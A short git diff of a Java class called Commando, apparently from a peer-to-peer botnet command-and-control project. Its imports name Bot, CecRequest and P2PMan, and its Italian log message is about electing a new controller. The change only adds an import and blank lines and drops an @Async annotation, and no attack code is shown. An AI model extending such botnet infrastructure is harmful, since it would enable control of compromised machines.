@@ -32,6 +32,7 @@ import cs.sii.model.role.Role;
 import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
 import cs.sii.network.request.CecRequest;
+import cs.sii.schedule.net.ScheduledTasksNet;
 import cs.sii.service.connection.NetworkService;
 import cs.sii.service.connection.P2PMan;
 import cs.sii.service.crypto.CryptoPKI;
@@ -73,6 +74,9 @@ public class Commando {
 	@Autowired
 	private CryptoUtils crypto;
 
+
+	
+	
 	/**
 	 * 
 	 */
@@ -287,7 +291,7 @@ public class Commando {
 	/**
 	 * 
 	 */
-	@Async
+	
 	public void startElection() {
 		System.out.println("Inizio fase di elezione del nuovo CeC");
 		List<Bot> botList = bServ.findAll();
